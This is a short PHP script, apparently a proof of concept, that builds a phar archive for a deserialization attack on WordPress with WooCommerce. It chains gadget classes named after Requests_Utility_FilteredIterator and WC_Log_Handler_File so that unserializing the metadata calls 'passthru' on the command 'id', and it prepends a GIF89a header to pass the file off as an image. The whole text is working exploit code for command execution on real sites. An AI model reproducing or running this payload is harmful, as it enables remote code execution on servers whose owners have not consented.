<?php
    class Requests_Utility_FilteredIterator extends ArrayIterator {
        protected $callback;
        public function __construct($data, $callback) {
            parent::__construct($data);
            $this->callback = $callback;
        }
    }

    class WC_Log_Handler_File {
        protected $handles;
        public function __construct() {
            $this->handles = new Requests_Utility_FilteredIterator(array('id'), 'passthru');
        }
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub, 增加gif文件头，伪造文件类型
    $o = new WC_Log_Handler_File();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>